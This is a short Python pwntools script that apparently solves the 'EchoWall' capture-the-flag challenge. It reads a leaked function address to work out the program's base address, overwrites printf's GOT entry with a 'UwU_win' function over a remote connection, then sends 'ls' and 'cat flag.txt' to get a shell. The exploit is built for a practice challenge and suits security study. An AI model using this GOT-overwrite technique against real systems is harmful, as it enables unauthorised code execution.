from pwn import *

binary = "./EchoWall"
context.log_level = 'debug'
s = 'b* UwU_main+263'

elf = ELF(binary)
r = remote('chal.firebird.sh', 35027)
# r = process(binary)
# gdb.attach(r, s)

r.recvuntil(b'0x')
print_wall_addr = int(b'0x' + r.recvuntil(b'|', drop=True), 16)

elf.address = print_wall_addr - elf.sym['print_wall']

log.info("print_wall address: " + hex(print_wall_addr))
log.info("base address:" + hex(elf.address))

r.sendlineafter(b'>', b'2')
r.sendlineafter(b'>', b'1')

r.sendafter(b'>', p64(elf.got['printf']))
r.sendafter(b'>', p64(elf.sym['UwU_win']))
r.sendline(b"ls")
r.sendline(b"cat flag.txt")
r.interactive()